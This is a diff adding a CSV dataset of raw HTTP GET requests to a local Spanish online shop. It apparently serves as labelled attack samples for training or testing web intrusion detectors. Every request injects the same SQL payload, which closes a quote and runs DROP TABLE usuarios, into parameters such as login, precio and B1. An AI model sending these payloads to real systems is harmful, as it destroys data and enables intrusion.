@@ -1,0 +1,2201 @@
+id,text
+112,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20504,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9240,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+14315,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+412,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+10430,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20578,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8532,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+23659,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+12856,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11538,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+16108,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9916,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8342,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+7881,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+6372,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+3894,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5762,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+3255,"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9012,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+6861,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1618,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22592,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15954,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+7924,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Confirmar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+7140,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8588&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+425,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7744&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+7637,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4344&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+3457,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1063&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+18634,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=7701&B1=Confirmar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+5539,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=5080&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8788,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=7191&B1=Confirmar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22923,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=3714&B1=Confirmar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+21438,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3650%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Confirmar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+21540,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8588&B1=Confirmar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+15410,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=3532&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13415,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=6072&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+3093,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=6606&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+24520,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&pwd=caLabrotar&remember=on&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+19004,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hedrich&pwd=chonta&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22903,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=76&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+3364,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=schlacht&pwd=43s8a&remember=off&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+24425,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sydney&pwd=r%24aToNESCA&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8881,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&pwd=ensa%F1ada&remember=on&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9257,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcnair&pwd=81cob6r&remember=off&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
